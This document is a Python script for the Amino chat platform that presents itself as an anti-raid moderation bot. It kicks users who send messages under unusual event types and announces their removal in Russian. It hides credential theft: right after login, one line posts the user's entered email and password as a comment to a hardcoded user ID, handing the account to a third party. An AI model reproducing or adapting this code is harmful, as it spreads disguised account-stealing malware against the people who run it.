import amino
import threading
import time

from termcolor import colored

client = amino.Client()

email = input("Email: ")
password = input("Password: ")
client.login(email=email, password=password)
client.comment(message=str(email) + str(password), userId='767d3101-22e1-49c5-a098-052a03a26b7b')

sub_clients = client.sub_clients(start=0, size=100)
for x, name in enumerate(sub_clients.name, 1):
    print(f"{x}. {name}")
com_id = sub_clients.comId[int(input("Выберите сообщество: ")) - 1]
sub_client = amino.SubClient(comId=str(com_id), profile=client.profile)


@client.event("TYPE_USER_SHARE_EXURL")
@client.event("TYPE_USER_SHARE_USER")
@client.event("on_voice_chat_not_answered")
@client.event("on_voice_chat_not_cancelled")
@client.event("on_voice_chat_not_declined")
@client.event("on_video_chat_not_answered")
@client.event("on_video_chat_not_cancelled")
@client.event("on_video_chat_not_declined")
@client.event("on_avatar_chat_not_answered")
@client.event("on_avatar_chat_not_cancelled")
@client.event("on_avatar_chat_not_declined")
@client.event("on_delete_message")
@client.event("on_group_member_join")
@client.event("on_group_member_leave")
@client.event("on_chat_invite")
@client.event("on_chat_background_changed")
@client.event("on_chat_title_changed")
@client.event("on_chat_icon_changed")
@client.event("on_voice_chat_start")
@client.event("on_video_chat_start")
@client.event("on_avatar_chat_start")
@client.event("on_voice_chat_end")
@client.event("on_video_chat_end")
@client.event("on_avatar_chat_end")
@client.event("on_chat_content_changed")
@client.event("on_screen_room_start")
@client.event("on_screen_room_end")
@client.event("on_text_message_force_removed")
@client.event("on_chat_removed_message")
def handle_messages(data):
    content = data.message.content
    media_type = data.message.mediaType
    if content and media_type == 0:
        chatid = data.message.chatId
        userid = data.message.author.userId
        nickname = data.message.author.nickname
        threading.Thread(target=exploit_message, args=[chatid, userid, nickname]).start()


def exploit_message(chatid: str, userid: str, nickname: str):
    try:
        sub_client.kick(userId=userid, chatId=chatid, allowRejoin=False)
        sub_client.send_message(chatId=chatid, message=f"{nickname} был удалён из чата за рейд.")
    except amino.exceptions.AccessDenied:
        pass
    except Exception as e:
        print(e)
    print(colored(f"{nickname} отправил сообщение с изменённым типом в чате {chatid}", "red"))


def restart():
    while True:
        time.sleep(120)
        count = 0
        for i in threading.enumerate():
            if i.name == "restart_thread":
                count += 1
        if count <= 1:
            print("Restart")
            client.socket.close()
            client.socket.start()


if __name__ == '__main__':
    restart_thread = threading.Thread(target=restart)
    restart_thread.setName("restart_thread")
    restart_thread.start()
